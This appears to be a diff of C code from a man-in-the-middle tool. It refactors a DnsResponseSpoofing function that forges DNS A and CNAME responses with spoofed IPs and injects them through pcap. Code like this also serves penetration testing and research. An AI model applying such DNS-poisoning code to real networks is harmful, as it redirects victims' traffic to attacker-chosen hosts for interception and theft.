@@ -17,7 +17,7 @@
 extern PHOSTNODE gDnsSpoofingList;
 
 
-BOOL DnsResponseSpoofing(unsigned char * rawPacket, pcap_t *deviceHandle, PHOSTNODE spoofingRecord, char *srcIp, char *dstIp)
+BOOL DnsResponseSpoofing(unsigned char * rawPacket, pcap_t *deviceHandle, PPOISONING_DATA spoofingRecord, char *srcIp, char *dstIp)
 {
   BOOL retVal = FALSE;
   unsigned char *spoofedDnsResponse = NULL;
@@ -27,13 +27,14 @@ BOOL DnsResponseSpoofing(unsigned char * rawPacket, pcap_t *deviceHandle, PHOSTN
   int counter = 0;
   
   // Create DNS response data block
-  if (spoofingRecord->Data.Type == RESP_A)
+  if (spoofingRecord->HostnodeToSpoof->Data.Type == RESP_A)
   {
-    responseData = CreateDnsResponse_A(spoofingRecord->Data.HostName, dnsBasicHdr->id, spoofingRecord->Data.SpoofedIp, spoofingRecord->Data.TTL);
+    responseData = CreateDnsResponse_A(spoofingRecord->HostnameToResolve, dnsBasicHdr->id, spoofingRecord->HostnodeToSpoof->Data.SpoofedIp, spoofingRecord->HostnodeToSpoof->Data.TTL);
   }
-  else if (spoofingRecord->Data.Type == RESP_CNAME)
+  else if (spoofingRecord->HostnodeToSpoof->Data.Type == RESP_CNAME)
   {
-    responseData = CreateDnsResponse_CNAME(spoofingRecord->Data.HostName, dnsBasicHdr->id, spoofingRecord->Data.CnameHost, spoofingRecord->Data.SpoofedIp, spoofingRecord->Data.TTL);
+    LogMsg(DBG_DEBUG, "DnsResponseSpoofing(): Data.HostName=%s, Data.CnameHost=%s, Data.SpoofedIp=%s, Data.TTL=%lu", spoofingRecord->HostnodeToSpoof->Data.HostName, spoofingRecord->HostnodeToSpoof->Data.CnameHost, spoofingRecord->HostnodeToSpoof->Data.SpoofedIp, spoofingRecord->HostnodeToSpoof->Data.TTL);
+    responseData = CreateDnsResponse_CNAME(spoofingRecord->HostnameToResolve, dnsBasicHdr->id, spoofingRecord->HostnodeToSpoof->Data.CnameHost, spoofingRecord->HostnodeToSpoof->Data.SpoofedIp, spoofingRecord->HostnodeToSpoof->Data.TTL);
   }
 
   if (responseData == NULL)
@@ -61,7 +62,7 @@ BOOL DnsResponseSpoofing(unsigned char * rawPacket, pcap_t *deviceHandle, PHOSTN
     if ((funcRetVal = pcap_sendpacket(deviceHandle, (unsigned char *)spoofedDnsResponse, basePacketSize + responseData->dataLength)) != 0)
     {
       LogMsg(DBG_HIGH, "%2d Response DNS poisoning failed (%d) : %s -> %s, deviceHandle=0x%08x",
-        counter, funcRetVal, spoofingRecord->Data.HostName, spoofingRecord->Data.SpoofedIp, deviceHandle);
+        counter, funcRetVal, spoofingRecord->HostnodeToSpoof->Data.HostName, spoofingRecord->HostnodeToSpoof->Data.SpoofedIp, deviceHandle);
       retVal = FALSE;
     }
     else
